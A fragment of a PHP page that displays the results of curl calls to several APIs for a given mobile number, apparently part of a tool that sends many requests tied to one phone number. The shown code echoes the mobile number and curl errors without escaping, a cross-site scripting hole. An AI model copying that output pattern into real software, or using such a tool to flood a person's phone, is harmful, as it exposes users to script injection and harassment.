            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $error = curl_error($ch);
            
            curl_close($ch);
            
            echo "<p><strong>URL:</strong> " . htmlspecialchars($api['url']) . "</p>";
            echo "<p><strong>Status Code:</strong> <span class='" . ($httpcode == 200 ? 'success' : 'error') . "'>" . $httpcode . "</span></p>";
            
            if ($error) {
                echo "<p><strong>Error:</strong> <span class='error'>" . $error . "</span></p>";
            }
            
            if ($response) {
                echo "<p><strong>Response:</strong> " . htmlspecialchars(substr($response, 0, 500));
                if (strlen($response) > 500) {
                    echo "... [truncated]";
                }
                echo "</p>";
            }
            
            echo "</div>";
        }
        
        echo "<hr><h3>All APIs processed for mobile number: " . $mobile . "</h3>";
    }
    ?>
</body>
</html>